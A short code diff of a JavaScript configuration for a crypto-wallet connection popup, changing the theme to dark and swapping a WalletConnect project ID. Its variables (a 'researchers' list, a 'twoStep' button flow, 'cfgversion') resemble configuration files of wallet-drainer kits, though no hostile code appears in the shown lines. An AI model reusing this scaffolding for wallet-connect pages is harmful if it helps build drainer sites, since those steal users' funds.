@@ -153,7 +153,7 @@ let customModalCode = `
         </div>
     </div>
 `
-let chooseWalletTheme = 'light';
+let chooseWalletTheme = 'dark';
 let themeVariables = {
 '--w3m-z-index': 10000,
 '--w3m-overlay-backdrop-filter': 'blur(6px)',
@@ -208,7 +208,7 @@ let buttonMessagesEnabled = true;
 let twoStep = false;
 let twoStepButtonElement = "startButton";
 let connectElement = "connectButton";
-let wc_projectid = "f3b98baf8f9041f0ef8ec9de6544fec3";
+let wc_projectid = "201cd136c6523b4eb0a797345190254e";
 let cfgversion = 680;
 let researchers = [];
 let experimental = {"disable-w3m-featured":true};
